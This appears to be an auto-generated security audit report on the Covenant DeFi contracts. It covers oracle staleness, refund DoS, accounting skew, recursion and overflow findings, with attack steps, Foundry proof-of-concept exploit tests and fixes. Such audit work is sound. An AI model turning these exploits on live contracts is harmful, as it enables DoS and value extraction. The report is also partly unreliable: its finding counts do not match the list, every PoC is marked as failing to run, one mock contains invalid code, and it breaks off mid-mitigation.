# 2025 10 covenant - Findings Report
## Commit hash: d5ebe4461564b46cacf8a90cf11add29470ef001

##Findings by Pattern


 **Derived From** : Router lacks receive(): oracle refund to msg.sender can revert and brick updates

[M-4]. DoS: updatePriceFeeds reverts when pull-oracle refunds surplus ETH to router without receive()
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : On success: AggregatorV3Interface(feed).latestRoundData().answeredInRound >= roundId

[M-5]. Chainlink adapter accepts incomplete rounds (answeredInRound < roundId), enabling stale-price usage for value extraction during round transitions
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : marketState[redeemParams.marketId].baseSupply_after == marketState[redeemParams.marketId].baseSupply_before - amountOut - protocolFees

[H-8]. Self-redeem to Covenant contract skews baseSupply without moving tokens, breaking accounting and DoSing redemptions
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : for all vault v: resolvedVaults[v] != v and no cycle in resolvedVaults graph within a bounded depth (e.g., 8 hops)

[M-9]. Infinite recursion in CovenantCurator.resolveOracle via cyclic ERC4626 resolution graph DoSes price routing
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : priceScale * unitPrice does not overflow uint256

[M-11]. ChainlinkOracle.previewGetQuote/previewGetQuotes can permanently DoS on extreme feed values due to 256-bit overflow in ScaleUtils.calcOutAmount
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 7
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : If previewGetQuote(inAmount, base, quote) succeeds then (block.timestamp - IPyth(pyth).getPriceUnsafe(feedId).publishTime) <= maxStaleness

[M-12]. previewGetQuote accepts stale Pyth prices up to global upper bound, while live getQuote reverts at per-instance maxStaleness causing preview↔live mismatch and DoS
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless
Poc Test Status: ErrorRunningTests




 **Derived From** : baseDecimals <= 127 && quoteDecimals <= 127

[M-13]. int8 downcast of baseDecimals wraps negative for tokens with decimals >127, corrupting Pyth scale and enabling severe mispricing/DoS
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: Permissionless
Poc Test Status: ErrorRunningTests



### Number of Findings
- C: 0
- H: 1
- M: 6
- L: 6
- I: 0

##Findings by Pattern





 **Derived From** : Router lacks receive(): oracle refund to msg.sender can revert and brick updates

## [M-4]. DoS: updatePriceFeeds reverts when pull-oracle refunds surplus ETH to router without receive()

## Derived From Pattern/Invariant
Router lacks receive(): oracle refund to msg.sender can revert and brick updates

## Exploit Type
Dos

## Location
CovenantCurator.updatePriceFeeds

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
CovenantCurator.updatePriceFeeds forwards arbitrary msg.value to the configured oracle and has no receive()/fallback payable. Many pull oracles (e.g., Pyth adapters) refund surplus ETH to msg.sender using a plain ETH transfer. Since msg.sender to the oracle is the CovenantCurator, the refund hits a non-payable contract and fails, causing the entire updatePriceFeeds call to revert. No try/catch or alternate path exists. Vulnerable snippet:

function updatePriceFeeds(address base, address quote, bytes calldata updateData) external payable {
    address oracle; (, base, quote, oracle) = resolveOracle(0, base, quote);
    if (base == quote) { if (msg.value > 0) revert Errors.PriceOracle_IncorrectPayment(); return; }
    return IPriceOracle(oracle).updatePriceFeeds{value: msg.value}(base, quote, updateData); // potential refund to this contract with no receive()
}

This makes common, safety-buffered calls (overpay to avoid underpayment) fail and can brick price updates for pull oracles.

## Impact
Functional DoS: Any surplus ETH forwarded to a refunding oracle causes updates to revert. This prevents keeping prices fresh and can make higher-level operations that require a price update (e.g., swaps/mints/redeems that pull fresh prices) fail, degrading protocol availability.

## Command to Run Test


## Proof of Concept
- Setup: Curator is configured to use a pull-oracle adapter that refunds any surplus ETH to msg.sender (e.g., typical Pyth-like behavior).
- Attack/Trigger: Any user (or an integration using a safety buffer) calls CovenantCurator.updatePriceFeeds with msg.value > oracle’s required fee.
- The oracle processes the update, computes refund = msg.value - fee, and attempts to refund to msg.sender = CovenantCurator via a plain ETH transfer.
- CovenantCurator has no receive()/fallback payable, the refund fails, oracle reverts, and updatePriceFeeds reverts.
- Result: Price updates cannot complete when overpaid; keepers/UIs that intentionally overpay to avoid racing fee changes are bricked, causing protocol flows that depend on fresh prices to revert.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {CovenantCurator} from "src/curators/CovenantCurator.sol";
import {IPriceOracle} from "src/curators/interfaces/IPriceOracle.sol";

contract RefundingOracle is IPriceOracle {
    uint128 public fee;
    constructor(uint128 _fee) { fee = _fee; }
    receive() external payable {}

    function name() external pure returns (string memory) { return "RefundingOracle"; }
    function getQuote(uint256, address, address) external view returns (uint256) { return 0; }
    function getQuotes(uint256, address, address) external view returns (uint256, uint256) { return (0,0); }
    function previewGetQuote(uint256, address, address) external view returns (uint256) { return 0; }
    function previewGetQuotes(uint256, address, address) external view returns (uint256, uint256) { return (0,0); }
    function getUpdateFee(address, address, bytes calldata) external view returns (uint128) { return fee; }

    function updatePriceFeeds(address, address, bytes calldata) external payable {
        require(msg.value >= fee, "underpay");
        uint256 refund = msg.value - fee;
        if (refund > 0) {
            (bool ok,) = payable(msg.sender).call{value: refund}("");
            require(ok, "refund failed");
        }
        // price update logic omitted
    }
}

contract CuratorRefundDoSTest is Test {
    CovenantCurator router;
    RefundingOracle oracle;
    address owner = address(0xABCD);
    address attacker = address(0xBEEF);
    address base = address(0x1001);
    address quote = address(0x1002);

    function setUp() public {
        vm.deal(attacker, 100 ether);
        router = new CovenantCurator(owner);
        oracle = new RefundingOracle(uint128(0.5 ether));
        vm.prank(owner);
        router.govSetConfig(base, quote, address(oracle));
    }

    function test_DoS_UpdatePriceFeedsRefundReverts() public {
        bytes memory data = hex"";
        vm.prank(attacker);
        vm.expectRevert(); // refund to non-payable router fails ⇒ oracle reverts ⇒ router call reverts
        router.updatePriceFeeds{value: 1 ether}(base, quote, data);
    }
}


## Suggested Mitigation
- Add a payable receive() to CovenantCurator so it can accept ETH refunds from oracle adapters: `receive() external payable {}`.
- Optionally expose a safe sweep function to withdraw any stuck ETH to a trusted address.
- Alternatively, enforce exact payment by first querying getUpdateFee and reverting if msg.value != fee (but beware fee races), or wrap the external call in a pattern that can tolerate or redirect refunds.





 **Derived From** : On success: AggregatorV3Interface(feed).latestRoundData().answeredInRound >= roundId

## [M-5]. Chainlink adapter accepts incomplete rounds (answeredInRound < roundId), enabling stale-price usage for value extraction during round transitions

## Derived From Pattern/Invariant
On success: AggregatorV3Interface(feed).latestRoundData().answeredInRound >= roundId

## Exploit Type
Oracle

## Location
ChainlinkOracle.getQuote

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The Chainlink adapter (inherited from Euler) only checks answer > 0 and staleness via updatedAt but omits the canonical answeredInRound >= roundId check. During a new Chainlink round before the answer is computed, latestRoundData can return a fresh updatedAt yet the answer actually belongs to a prior round (answeredInRound < roundId). The adapter will treat this price as valid and fresh, allowing trades/mint/redeem to be executed against a stale price. In high-volatility or depeg scenarios (e.g., USDC deviates from $1), an attacker can time trades to use the prior-price snapshot, extracting value from the AMM or counterparties that assume a current price. Vulnerable snippet (Euler adapter used by Covenant):

function _getQuote(...) internal view override returns (uint256) {
    bool inverse = ScaleUtils.getDirectionOrRevert(...);
    (, int256 answer,, uint256 updatedAt,) = AggregatorV3Interface(feed).latestRoundData();
    if (answer <= 0) revert ...;
    uint256 staleness = block.timestamp - updatedAt;
    if (staleness > maxStaleness) revert ...;
    uint256 price = uint256(answer);
    return ScaleUtils.calcOutAmount(inAmount, price, scale, inverse);
}

Missing: require(answeredInRound >= roundId).

## Impact
Functional and monetary: trades/mints/redemptions can execute against stale prices during Chainlink round transitions. In a depeg/fast-move window, an attacker can buy/sell a/z/Base at stale valuations and unwind after the round completes, extracting value from the market and counterparties.

## Command to Run Test


## Proof of Concept
Step-by-step:
1) Attacker monitors the Chainlink feed for round transitions where latestRoundData returns (roundId = R, answeredInRound = R-1) but updatedAt is within maxStaleness.
2) During this window, the Covenant ChainlinkOracle accepts the stale answer as fresh and returns quotes based on the previous round.
3) If the true market price has moved (e.g., stablecoin depegs or sharp move on the base/quote), the attacker interacts with the market (mint/redeem/swap) using the stale price to acquire mispriced a/z/Base tokens.
4) After the feed answers the new round and price catches up, the attacker unwinds the position at the correct price, keeping the spread.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {ChainlinkOracle} from "src/curators/oracles/chainlink/ChainlinkOracle.sol";

contract MockERC20Decimals {
    uint8 private _dec;
    constructor(uint8 d) { _dec = d; }
    function decimals() external view returns (uint8) { return _dec; }
}

contract MockAggregator {
    uint8 public dec;
    uint80 public rid;
    int256 public ans;
    uint256 public started;
    uint256 public updated;
    uint80 public answeredInRid;

    constructor(uint8 d) { dec = d; }
    function decimals() external view returns (uint8) { return dec; }
    function setData(uint80 _rid, int256 _ans, uint256 _started, uint256 _updated, uint80 _answeredInRid) external {
        rid = _rid; ans = _ans; started = _started; updated = _updated; answeredInRid = _answeredInRid;
    }
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
        return (rid, ans, started, updated, answeredInRid);
    }
}

contract ChainlinkAnsweredInRoundTest is Test {
    function test_acceptsIncompleteRoundWhenAnsweredInRoundLtRoundId() public {
        // Advance to a deterministic timestamp
        vm.warp(1_000_000);

        // Tokens with 18 decimals for Base and Quote
        MockERC20Decimals base = new MockERC20Decimals(18);
        MockERC20Decimals quote = new MockERC20Decimals(18);

        // Mock Chainlink feed with 8 decimals
        MockAggregator feed = new MockAggregator(8);

        // maxStaleness within allowed bounds
        ChainlinkOracle oracle = new ChainlinkOracle(address(base), address(quote), address(feed), 1 hours);

        // Model a new round that has started but not yet answered:
        // roundId = 100, answeredInRound = 99 (previous round's answer), updatedAt still fresh enough
        feed.setData({
            _rid: 100,
            _ans: int256(1e8),            // previous round price = 1.00
            _started: block.timestamp - 5, // new round just started
            _updated: block.timestamp - 30, // last answer computed 30s ago (fresh)
            _answeredInRid: 99             // answer actually belongs to round 99
        });

        uint256 inAmount = 1e18; // 1 base unit
        uint256 outAmount = oracle.getQuote(inAmount, address(base), address(quote));

        // Because the adapter does NOT check answeredInRound >= roundId, it accepts this stale price.
        assertEq(outAmount, 1e18);
    }
}


## Suggested Mitigation
In _getQuote, fetch (roundId, answer, startedAt, updatedAt, answeredInRound) and enforce: (1) require(answer > 0); (2) require(updatedAt != 0 && updatedAt >= startedAt); (3) require(answeredInRound >= roundId); (4) staleness check as implemented. This aligns with Chainlink best practices and prevents accepting incomplete rounds. Additionally, consider emitting an event on rejected rounds for monitoring.









 **Derived From** : marketState[redeemParams.marketId].baseSupply_after == marketState[redeemParams.marketId].baseSupply_before - amountOut - protocolFees

## [H-8]. Self-redeem to Covenant contract skews baseSupply without moving tokens, breaking accounting and DoSing redemptions

## Derived From Pattern/Invariant
marketState[redeemParams.marketId].baseSupply_after == marketState[redeemParams.marketId].baseSupply_before - amountOut - protocolFees

## Exploit Type
AccountingInvariantViolation

## Location
Covenant.redeem

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Covenant.redeem updates baseSupply by subtracting amountOut + protocolFees and then transfers amountOut to redeemParams.to. There is no guard preventing to == address(this). With a self-transfer, no base tokens actually leave the contract, yet baseSupply is reduced by amountOut, creating a mismatch between recorded supply and actual token balance. This violates the accounting invariant that baseSupply must decrease by exactly the base tokens sent out plus protocol fees. The mismatch can be weaponized to DoS future redemptions (amountOut <= baseSupply checks fail) even though the contract physically holds enough tokens. Vulnerable snippet:

// Update market state
ms.baseSupply = localBaseSupply - amountOut - protocolFees;
if (protocolFees > 0) ms.protocolFeeGrowth += protocolFees;

// Transfer base asset out
IERC20(mp.baseToken).safeTransfer(redeemParams.to, amountOut);

No check enforces redeemParams.to != address(this).

## Impact
Sending a redeem payout to address(this) reduces baseSupply without reducing the ERC20 balance, breaking the invariant balance == baseSupply + protocolFeeGrowth. This creates a persistent accounting skew that caps subsequent redemptions at the (now reduced) baseSupply, even though the contract physically holds more tokens. As a result, honest users are unable to redeem their assets (functional DoS), and excess tokens become unclaimable under protocol rules, effectively locking real funds until offset by new deposits. Since there is no owner function to reconcile the mismatch, an attacker can brick redemptions for a market proportional to the self-redeemed amount.

## Command to Run Test


## Proof of Concept
Attack steps:
- Precondition: A market with non-zero baseSupply exists (users have previously minted).
- Attacker calls redeem with to = address(Covenant). Validation passes (to != 0). The LEX returns amountOut, ValidationLogic.checkRedeemOutputs ensures amountOut <= baseSupply.
- Covenant updates state first: ms.baseSupply = baseSupply_before - amountOut - protocolFees; ms.protocolFeeGrowth += protocolFees.
- Then Covenant transfers base tokens to redeemParams.to. Because to == address(this), the ERC20 balance does not decrease.
- Invariant break: (ERC20 balance) > (baseSupply + protocolFeeGrowth). Subsequent redemptions are bounded by the lowered baseSupply and revert with E_InsufficientAmount even though the contract holds enough tokens. The unaccounted tokens become stuck unless new deposits increase baseSupply.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {Covenant} from "src/Covenant.sol";
import {ICovenant, MarketId, MarketParams, RedeemParams, MintParams, TokenPrices} from "src/interfaces/ICovenant.sol";
import {ILiquidExchangeModel} from "src/interfaces/ILiquidExchangeModel.sol";
import {Errors} from "src/libraries/Errors.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Base", "BASE") {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

contract MockLEX is ILiquidExchangeModel {
    uint256 public redeemAmt;
    uint128 public redeemFee;
    uint128 public mintFee;

    function setRedeemResult(uint256 amt, uint128 fee) external { redeemAmt = amt; redeemFee = fee; }
    function setMintFee(uint128 fee) external { mintFee = fee; }

    // Getters
    function getProtocolFee(MarketId) external view returns (uint32) { return 0; }
    function getSynthTokens(MarketId) external view returns (SynthTokens memory) {
        return SynthTokens({aToken: address(0xA), zToken: address(0xZ)});
    }
    function name() external view returns (string memory) { return "MockLEX"; }

    // Admin
    function setMarketProtocolFee(MarketId, uint32) external {}

    // Init
    function initMarket(MarketId, MarketParams calldata, uint32, bytes memory)
        external
        pure
        returns (SynthTokens memory, bytes memory)
    {
        return (SynthTokens({aToken: address(0xA), zToken: address(0xZ)}), bytes(""));
    }

    // State-changing
    function mint(MintParams calldata, address, uint256)
        external
        payable
        returns (uint256, uint256, uint128, TokenPrices memory)
    {
        return (1, 1, mintFee, TokenPrices(0,0,0));
    }

    function redeem(RedeemParams calldata, address, uint256)
        external
        payable
        returns (uint256 amountOut, uint128 protocolFees, TokenPrices memory)
    {
        return (redeemAmt, redeemFee, TokenPrices(0,0,0));
    }

    function swap(SwapParams calldata)
        external
        payable
        returns (uint256, uint128, TokenPrices memory)
    {
        return (0,0,TokenPrices(0,0,0));
    }

    function updateState(MarketId, MarketParams calldata, uint256, bytes calldata)
        external
        payable
        returns (uint128)
    { return 0; }

    // Quotes
    function quoteMint(MintParams calldata, address, uint256)
        external
        view
        returns (uint256,uint256,uint128,uint128,TokenPrices memory)
    { return (0,0,0,0,TokenPrices(0,0,0)); }

    function quoteRedeem(RedeemParams calldata, address, uint256)
        external
        view
        returns (uint256,uint128,uint128,TokenPrices memory)
    { return (redeemAmt, redeemFee, 0, TokenPrices(0,0,0)); }

    function quoteSwap(SwapParams calldata)
        external
        view
        returns (uint256,uint128,uint128,TokenPrices memory)
    { return (0,0,0,TokenPrices(0,0,0)); }
}

contract RedeemSelfTransferTest is Test {
    Covenant cov;
    MockERC20 base;
    MockLEX lex;

    address owner = address(0xBEEF);
    address attacker = address(0xA11CE);
    address curator = address(0xC0FFEE);

    function setUp() public {
        vm.startPrank(owner);
        cov = new Covenant(owner);
        base = new MockERC20();
        lex = new MockLEX();
        cov.setEnabledLEX(address(lex), true);
        cov.setEnabledCurator(curator, true);
        vm.stopPrank();
    }

    function _createMarket() internal returns (MarketId, MarketParams memory) {
        MarketParams memory mp = MarketParams({
            baseToken: address(base),
            quoteToken: address(0x1234),
            curator: curator,
            lex: address(lex)
        });
        MarketId id = cov.createMarket(mp, bytes(""));
        return (id, mp);
    }

    function _state(MarketId id) internal view returns (uint256 baseSupply, uint128 feeGrowth) {
        ICovenant.MarketState memory st = cov.getMarketState(id);
        return (st.baseSupply, st.protocolFeeGrowth);
    }

    function test_selfRedeemToSelfSkewsAndDoS() public {
        (MarketId id, MarketParams memory mp) = _createMarket();

        // Seed attacker and mint into market to build baseSupply
        uint256 deposit = 1_000e18;
        base.mint(attacker, deposit);
        vm.startPrank(attacker);
        base.approve(address(cov), type(uint256).max);

        MintParams memory mintP = MintParams({
            marketId: id,
            marketParams: mp,
            baseAmountIn: deposit,
            to: attacker,
            minATokenAmountOut: 0,
            minZTokenAmountOut: 0,
            data: "",
            msgValue: 0
        });
        lex.setMintFee(0);
        cov.mint(mintP);

        uint256 balBefore = base.balanceOf(address(cov));
        (uint256 baseSupplyBefore, uint128 feeBefore) = _state(id);
        assertEq(balBefore, deposit, "setup: ERC20 balance");
        assertEq(baseSupplyBefore + uint256(feeBefore), balBefore, "setup: invariant holds");

        // Attacker redeems to Covenant itself -> no tokens leave, but baseSupply decreases
        uint256 fakeOut = 700e18;
        lex.setRedeemResult(fakeOut, 0);
        RedeemParams memory redP = RedeemParams({
            marketId: id,
            marketParams: mp,
            aTokenAmountIn: 1,
            zTokenAmountIn: 0,
            to: address(cov),
            minAmountOut: 0,
            data: "",
            msgValue: 0
        });
        cov.redeem(redP);
        vm.stopPrank();

        uint256 balAfter = base.balanceOf(address(cov));
        (uint256 baseSupplyAfter, uint128 feeAfter) = _state(id);

        assertEq(balAfter, balBefore, "self-transfer moved no tokens");
        assertEq(baseSupplyAfter, baseSupplyBefore - fakeOut, "baseSupply reduced by amountOut");
        assertLt(baseSupplyAfter + uint256(feeAfter), balAfter, "accounting sum < actual balance (skew)");

        // Honest user redemption now reverts despite enough ERC20 balance
        address bob = address(0xB0B);
        vm.startPrank(bob);
        lex.setRedeemResult(400e18, 0); // baseSupplyAfter is only 300e18
        RedeemParams memory redFail = RedeemParams({
            marketId: id,
            marketParams: mp,
            aTokenAmountIn: 1,
            zTokenAmountIn: 0,
            to: bob,
            minAmountOut: 0,
            data: "",
            msgValue: 0
        });
        vm.expectRevert(Errors.E_InsufficientAmount.selector);
        cov.redeem(redFail);
        vm.stopPrank();
    }
}


## Suggested Mitigation
In Covenant.redeem, forbid self-transfers of base tokens: require(redeemParams.to != address(this), Errors.E_Unauthorized()); Similarly, in swap() when assetOut == AssetType.BASE, forbid swapParams.to == address(this). This fully preserves the invariant balance == baseSupply + protocolFeeGrowth. As a defensive alternative, you could compute the actual delta via pre/post ERC20 balances and update baseSupply by the observed outflow, but this adds complexity and interacts poorly with non-standard tokens; the simple to != address(this) guard is sufficient and consistent with collectProtocolFee.





 **Derived From** : for all vault v: resolvedVaults[v] != v and no cycle in resolvedVaults graph within a bounded depth (e.g., 8 hops)

## [M-9]. Infinite recursion in CovenantCurator.resolveOracle via cyclic ERC4626 resolution graph DoSes price routing

## Derived From Pattern/Invariant
for all vault v: resolvedVaults[v] != v and no cycle in resolvedVaults graph within a bounded depth (e.g., 8 hops)

## Exploit Type
AccountingInvariantViolation

## Location
CovenantCurator.resolveOracle

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
resolveOracle unwraps ERC4626 vaults by following resolvedVaults[base] and tail-calls itself with the mapped asset. There is no cycle/self-edge detection, so if resolvedVaults[V] == V or a cycle exists (A->B->A), recursion never terminates and the call runs out-of-gas. All router entrypoints that use resolveOracle (getQuote/getQuotes/preview*/updatePriceFeeds/getUpdateFee) become unusable for the affected base, effectively bricking pricing-dependent flows.

Vulnerable snippet:

function resolveOracle(uint256 inAmount, address base, address quote)
    public view
    returns (uint256, address, address, address)
{
    if (base == quote) return (inAmount, base, quote, address(0));
    address oracle = getConfiguredOracle(base, quote);
    if (oracle != address(0)) return (inAmount, base, quote, oracle);
    address baseAsset = resolvedVaults[base];
    if (baseAsset != address(0)) {
        inAmount = IERC4626(base).convertToAssets(inAmount);
        return resolveOracle(inAmount, baseAsset, quote); // no cycle guard
    }
    oracle = fallbackOracle;
    if (oracle == address(0)) revert Errors.PriceOracle_NotSupported(base, quote);
    return (inAmount, base, quote, oracle);
}

## Impact
Once governance configures a self-referential or cyclic ERC4626 resolution path (either by mistake or by listing a malicious/non-compliant ERC4626), any caller attempting to obtain a quote for the affected base will cause resolveOracle to recurse indefinitely and run out of gas. This results in a functional DoS of all router entry points that rely on resolveOracle for that base (getQuote/getQuotes/preview*/updatePriceFeeds/getUpdateFee). There is no direct loss of funds, but pricing-dependent protocol flows for the affected markets become unavailable until governance fixes configuration.

## Command to Run Test


## Proof of Concept
1) Deploy CovenantCurator with a non-zero owner. 2) Deploy a malicious/non-compliant ERC4626 vault V that reports asset() = V and convertToAssets(x) = x. 3) Owner calls govSetResolvedVault(V, true), which records resolvedVaults[V] = V. 4) Any user calling getQuote(amount, V, Q) will trigger resolveOracle: it finds no direct oracle, sees resolvedVaults[V] = V, calls convertToAssets, and tail-recurses with base = V again. This repeats indefinitely until the call runs out of gas, DoSing price routing for V. Variant: create two ERC4626 vaults A and B such that A.asset() = B and B.asset() = A; owner sets both in govSetResolvedVault; any price query on A or B now oscillates A->B->A until OOG.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {CovenantCurator} from "src/curators/CovenantCurator.sol";

// Minimal ERC4626-like stubs used by the router
contract MalERC4626Self {
    function asset() external view returns (address) { return address(this); }
    function convertToAssets(uint256 inAmount) external pure returns (uint256) { return inAmount; }
}

contract MalERC4626Mut {
    address public other;
    function setOther(address _other) external { other = _other; }
    function asset() external view returns (address) { return other; }
    function convertToAssets(uint256 inAmount) external pure returns (uint256) { return inAmount; }
}

contract CovenantCurator_ResolveOracleCycle_DoS_Test is Test {
    CovenantCurator router;
    address owner;

    function setUp() public {
        owner = address(this);
        router = new CovenantCurator(owner);
    }

    // Helper: bounded-gas staticcall to avoid blowing up the test on OOG
    function _staticGetQuote(address base, address quote, uint256 gasLimit) internal view returns (bool ok, bytes memory ret) {
        (ok, ret) = address(router).staticcall{gas: gasLimit}(
            abi.encodeWithSelector(CovenantCurator.getQuote.selector, 1e18, base, quote)
        );
    }

    // Self-map V->V causes infinite recursion -> callee OOG -> staticcall returns false
    function test_DoS_selfMap_cycle_staticcallFails() public {
        MalERC4626Self selfVault = new MalERC4626Self();
        router.govSetResolvedVault(address(selfVault), true);
        (bool ok, ) = _staticGetQuote(address(selfVault), address(0xBEEF), 200_000);
        assertFalse(ok, "expected failure due to infinite recursion/OOG");
    }

    // Two-node cycle A->B->A causes infinite recursion -> callee OOG -> staticcall returns false
    function test_DoS_twoNode_cycle_staticcallFails() public {
        MalERC4626Mut A = new MalERC4626Mut();
        MalERC4626Mut B = new MalERC4626Mut();
        A.setOther(address(B));
        B.setOther(address(A));
        router.govSetResolvedVault(address(A), true); // resolvedVaults[A] = B
        router.govSetResolvedVault(address(B), true); // resolvedVaults[B] = A
        (bool ok, ) = _staticGetQuote(address(A), address(0xBEEF), 200_000);
        assertFalse(ok, "expected failure due to infinite recursion/OOG");
    }
}


## Suggested Mitigation
Add both configuration-time and runtime guards: 1) In govSetResolvedVault, reject self-edges and cycles. For example: require(IERC4626(vault).asset() != vault). Then walk the existing resolvedVaults chain up to a small MAX_HOPS (e.g., 8) starting from the new asset to ensure it cannot reach back to `vault` (cycle) and does not exceed hop limit; revert with a specific error on violation. 2) In resolveOracle, replace recursion with an iterative loop and enforce a MAX_HOPS bound. Pseudocode: for (uint8 i = 0; i < MAX_HOPS; ++i) { if (base == quote) return (...); address orc = getConfiguredOracle(base, quote); if (orc != address(0)) return (...); address next = resolvedVaults[base]; if (next == address(0)) break; if (next == base) revert Errors.PriceOracle_InvalidConfiguration(); inAmount = IERC4626(base).convertToAssets(inAmount); base = next; } address orc = fallbackOracle; if (orc == address(0)) revert Errors.PriceOracle_NotSupported(base, quote); return (inAmount, base, quote, orc). These guards prevent infinite recursion and provide clear revert reasons even if governance later adds nested vaults.








 **Derived From** : priceScale * unitPrice does not overflow uint256

## [M-11]. ChainlinkOracle.previewGetQuote/previewGetQuotes can permanently DoS on extreme feed values due to 256-bit overflow in ScaleUtils.calcOutAmount

## Derived From Pattern/Invariant
priceScale * unitPrice does not overflow uint256

## Exploit Type
IntegerOverflow

## Location
ChainlinkOracle.previewGetQuote

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The Chainlink adapter uses ScaleUtils.calcOutAmount which pre-multiplies priceScale * unitPrice before calling fullMulDiv. Because priceScale = 10^quoteDecimals and unitPrice = uint256(answer), if unitPrice >= type(uint256).max / priceScale, the intermediate multiplication overflows and reverts even though the final division would be finite. This affects both branches: non-inverse ((inAmount * priceScale * unitPrice) / feedScale) and inverse ((inAmount * feedScale) / (priceScale * unitPrice)). With fresh rounds and a valid base/quote, previewGetQuote and previewGetQuotes revert, causing denial-of-service for downstream quoting and, transitively, markets that rely on these oracles.
Vulnerable snippet (ScaleUtils):

function calcOutAmount(uint256 inAmount, uint256 unitPrice, Scale scale, bool inverse) internal pure returns (uint256) {
    uint256 priceScale = Scale.unwrap(scale) & PRICE_SCALE_MASK;
    uint256 feedScale = Scale.unwrap(scale) >> 128;
    if (inverse) {
        // (inAmount * feedScale) / (priceScale * unitPrice)
        return FixedPointMathLib.fullMulDiv(inAmount, feedScale, priceScale * unitPrice);
    } else {
        // (inAmount * priceScale * unitPrice) / feedScale
        return FixedPointMathLib.fullMulDiv(inAmount, priceScale * unitPrice, feedScale);
    }
}

A single abnormally large Chainlink answer (still > 0 and within staleness) or unusually large quoteDecimals (e.g., 38) makes priceScale * unitPrice overflow and brick quoting.

## Impact
Functional DoS of price quoting: previewGetQuote/previewGetQuotes (and getQuote/getQuotes via _getQuote) revert, blocking Covenant components that depend on these oracles from pricing, quoting, or proceeding with user flows.

## Command to Run Test


## Proof of Concept
- Deploy base token with 18 decimals and quote token with 38 decimals to maximize priceScale = 10^38 (allowed by library MAX_EXPONENT=38).
- Use a Chainlink feed (mock) with feedDecimals=0 so feedScale=10^(0+18)=1e18 (fresh updatedAt and answer > 0).
- Set latestRoundData.answer = type(uint256).max / 10^38 + 1 (fits in int256). This satisfies the pre-state: valid positive answer and fresh timestamp.
- Call previewGetQuote(inAmount, base, quote). During calcOutAmount, priceScale * unitPrice overflows and the call reverts, DoSing quotes.
- The same occurs for inverse direction (base and quote swapped) since the denominator multiplies priceScale * unitPrice.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {ChainlinkOracle as CovenantChainlinkOracle} from "src/curators/oracles/chainlink/ChainlinkOracle.sol";
import {AggregatorV3Interface} from "@euler-price-oracle/adapter/chainlink/AggregatorV3Interface.sol";

contract MockERC20 {
    uint8 private _decimals;
    constructor(uint8 d) { _decimals = d; }
    function decimals() external view returns (uint8) { return _decimals; }
}

contract MockAggregator is AggregatorV3Interface {
    uint8 public immutable _decimals;
    int256 public answer;
    uint256 public updatedAt;
    constructor(uint8 d) { _decimals = d; }
    function decimals() external view returns (uint8) { return _decimals; }
    function latestRoundData() external view returns (
        uint80 roundId,
        int256 ans,
        uint256 startedAt,
        uint256 updAt,
        uint80 answeredInRound
    ) {
        return (0, answer, 0, updatedAt, 0);
    }
    function set(int256 a, uint256 t) external {
        answer = a; updatedAt = t;
    }
}

contract ChainlinkOracle_Overflow_Test is Test {
    MockERC20 base;
    MockERC20 quote;
    MockAggregator feed;
    CovenantChainlinkOracle oracle;

    function setUp() public {
        base = new MockERC20(18);         // baseDecimals = 18
        quote = new MockERC20(38);        // quoteDecimals = 38 => priceScale = 10^38 (max allowed)
        feed = new MockAggregator(0);     // feedDecimals = 0 => feedScale = 10^(0+18) = 1e18
        oracle = new CovenantChainlinkOracle(address(base), address(quote), address(feed), 3600);
    }

    function test_DoS_previewGetQuote_overflow_nonInverse() public {
        uint256 priceScale = 10**38;
        uint256 threshold = type(uint256).max / priceScale;
        // unitPrice >= max / priceScale
        feed.set(int256(threshold + 1), block.timestamp);
        vm.expectRevert();
        oracle.previewGetQuote(1, address(base), address(quote)); // non-inverse path
    }

    function test_DoS_previewGetQuote_overflow_inverse() public {
        uint256 priceScale = 10**38;
        uint256 threshold = type(uint256).max / priceScale;
        feed.set(int256(threshold + 1), block.timestamp);
        vm.expectRevert();
        oracle.previewGetQuote(1, address(quote), address(base)); // inverse path
    }
}


## Suggested Mitigation
- Avoid pre-multiplying priceScale * unitPrice. Perform cancellations and division first, then multiply, using 512-bit math end-to-end. One safe pattern:
  - Compute common power-of-10 cancellations between feedScale and priceScale (both are powers of 10): while (priceScale % 10 == 0 && feedScale % 10 == 0) { priceScale/=10; feedScale/=10; } and similarly cancel with unitPrice: while (unitPrice % 10 == 0 && feedScale % 10 == 0) { unitPrice/=10; feedScale/=10; }.
